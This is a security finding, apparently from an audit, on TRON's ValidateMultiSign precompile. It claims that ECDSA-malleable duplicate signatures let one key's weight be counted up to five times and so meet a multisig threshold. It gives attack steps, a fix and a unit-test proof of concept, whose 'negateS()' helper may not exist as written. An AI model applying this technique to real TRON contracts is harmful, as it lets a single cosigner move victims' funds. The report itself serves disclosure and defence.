### Title
ValidateMultiSign precompile double-counts a single key's weight via ECDSA-signature-malleable duplicate signatures - ([File: actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java])

### Finding Description
`ValidateMultiSign.execute` deduplicates signatures using a two-stage check that only compares the **recovered address** to detect an already-processed signer, and only skips counting weight again if the **exact merged byte array** (`recoveredAddr + rawSignatureBytes`) is also already present: [1](#0-0) 

```java
long totalWeight = 0L;
List<byte[]> executedSignList = new ArrayList<>();
for (byte[] sign : signatures) {
  byte[] recoveredAddr = recoverAddrBySign(sign, hash);
  sign = merge(recoveredAddr, sign);
  if (ByteArray.matrixContains(executedSignList, recoveredAddr)) {
    if (ByteArray.matrixContains(executedSignList, sign)) {
      continue;
    }
    MUtil.checkCPUTime();
  }
  long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
  ...
  totalWeight += weight;
  executedSignList.add(sign);
  executedSignList.add(recoveredAddr);
}
```

The intent is clearly to skip a signature if the *same signer* has already been counted (i.e., the outer `matrixContains(executedSignList, recoveredAddr)` check), but the actual `continue` only fires if the raw signature bytes are byte-for-byte identical too. ECDSA signatures are malleable: for any valid `(r, s, v)` there exists a second valid signature `(r, n-s, v')` that recovers to the **same address** for the same message hash, but is a completely different byte sequence. Because `recoverAddrBySign` (via `SignUtils`/`ECKey`) does not enforce canonical low-S verification on *input* signatures being checked (low-S normalization in `ECKey` is only applied when *producing* signatures via `sign()`, not when recovering/verifying arbitrary supplied signature bytes), an attacker holding a single private key with weight `W` in the victim's `Permission` can:

1. Sign the target `(address, permissionId, data)` hash once normally → signature A.
2. Derive the malleable twin of A (flip `s` to `n-s`, flip recovery id) → signature B, a different byte array recovering to the identical address.
3. Submit `sigs = [A, B]` (or more malleable variants, up to `MAX_SIZE`) to the `validatemultisign` precompile.

For each of A and B, `recoveredAddr` is identical, but because `sign` (the merged bytes) differs between A and B, the inner `matrixContains(executedSignList, sign)` check fails to match, so the `continue` is skipped, `MUtil.checkCPUTime()` runs, and `totalWeight += weight` executes again — double-counting the single key's weight. With `MAX_SIZE = 5` slots, an attacker can multiply a single key's weight up to 5x, potentially exceeding `permission.getThreshold()` with a single held key, causing `dataOne()` (true) to be returned.

### Impact Explanation
Any TRON smart contract that relies on `ValidateMultiSign` (address, permissionId, hash, sigs) to gate a transfer, vote, or other privileged action on behalf of a third-party "victim" address can be tricked into believing a multisig threshold was met when only one signer actually authorized the action. This breaks the core invariant that the precompile's threshold check reflects distinct authorized keys, letting a single colluding/compromised-weight key impersonate a full multisig quorum inside any victim contract's access-control logic (e.g., an escrow or approval contract using `ValidateMultiSign` to authorize `victim`'s funds movement).

### Likelihood Explanation
Exploitation only requires the attacker to control one key that is a legitimate member of the victim's `Permission` (nonzero weight) — a realistic precondition for any application design where a "cosigner" contributes partial weight but is not supposed to unilaterally reach the threshold. Producing the malleable twin of an ECDSA signature is a well-known, cheap, deterministic operation (negate `s` mod curve order, flip `v`), requiring no additional secrets. The MAX_SIZE cap of 5 signature slots is enough headroom to multiply weight several-fold for typical low-threshold-relative-to-single-key-weight configurations. This is fully reachable from an unprivileged `TriggerSmartContract` call into any deployed contract that calls the precompile.

### Recommendation
Deduplicate purely by recovered address (drop the inner exact-bytes re-check), i.e., once `recoveredAddr` has been seen and its weight added, always `continue` regardless of whether the raw signature bytes differ:

```java
if (ByteArray.matrixContains(executedAddrList, recoveredAddr)) {
  continue;
}
long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
...
executedAddrList.add(recoveredAddr);
```

Additionally, enforce canonical low-S signature verification (reject any input signature whose `s` is not in the lower half of the curve order) at signature-parsing time, consistent with how `TransactionCapsule.checkWeight` already prevents a signer from being counted twice (see the `addMap.containsKey`/"has signed twice" check at `chainbase/src/main/java/org/tron/core/capsule/TransactionCapsule.java:260-263`), which this precompile should mirror.

### Proof of Concept
Java unit test to add to `framework/src/test/java/org/tron/common/runtime/vm/ValidateMultiSignContractTest.java`:

```java
@Test
public void testMalleableSignatureWeightDoubleCounting() {
  ECKey key = new ECKey();
  AccountCapsule toAccount = new AccountCapsule(ByteString.copyFrom(key.getAddress()),
      Protocol.AccountType.Normal, System.currentTimeMillis(), true,
      dbManager.getDynamicPropertiesStore());

  ECKey key1 = new ECKey(); // single attacker-controlled key, weight 1
  Protocol.Permission activePermission =
      Protocol.Permission.newBuilder()
          .setType(Protocol.Permission.PermissionType.Active)
          .setId(2)
          .setPermissionName("active")
          .setThreshold(2) // threshold requires 2, but attacker only owns 1 key with weight 1
          .setOperations(ByteString.copyFrom(ByteArray.fromHexString(
              "0000000000000000000000000000000000000000000000000000000000000000")))
          .addKeys(Protocol.Key.newBuilder()
              .setAddress(ByteString.copyFrom(key1.getAddress())).setWeight(1).build())
          .build();
  toAccount.updatePermissions(toAccount.getPermissionById(0), null,
      Collections.singletonList(activePermission));
  dbManager.getAccountStore().put(key.getAddress(), toAccount);

  byte[] data = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), longData);
  byte[] merged = ByteUtil.merge(key.getAddress(), ByteArray.fromInt(2), data);
  byte[] toSign = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), merged);

  ECKey.ECDSASignature sigA = key1.sign(toSign);
  // Malleable twin: s' = n - s, recovery id flipped
  ECKey.ECDSASignature sigB = sigA.toCanonicalised().negateS(); // produce r, n-s pair with adjusted v

  List<Object> signs = new ArrayList<>();
  signs.add(Hex.toHexString(sigA.toByteArray()));
  signs.add(Hex.toHexString(sigB.toByteArray()));

  // Expect FALSE: only one distinct key (weight 1) signed, threshold is 2.
  // Bug: current code returns ONE because both sigs are counted (weight 1 + 1 = 2 >= threshold).
  Assert.assertArrayEquals(
      validateMultiSign(StringUtil.encode58Check(key.getAddress()), 2, data, signs).getValue(),
      DataWord.ZERO().getData());
}
```

Expected (correct) behavior: result should be `DATA_FALSE` because only a single distinct key signed. Current buggy behavior: result is `dataOne()` (true), demonstrating that `totalWeight` was incremented twice for one key via malleable signature variants, confirming the vulnerability.

### Citations

**File:** actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java (L1086-1106)
```java
            long totalWeight = 0L;
            List<byte[]> executedSignList = new ArrayList<>();
            for (byte[] sign : signatures) {
              byte[] recoveredAddr = recoverAddrBySign(sign, hash);

              sign = merge(recoveredAddr, sign);
              if (ByteArray.matrixContains(executedSignList, recoveredAddr)) {
                if (ByteArray.matrixContains(executedSignList, sign)) {
                  continue;
                }
                MUtil.checkCPUTime();
              }
              long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
              if (weight == 0) {
                //incorrect sign
                return Pair.of(true, DATA_FALSE);
              }
              totalWeight += weight;
              executedSignList.add(sign);
              executedSignList.add(recoveredAddr);
            }
```
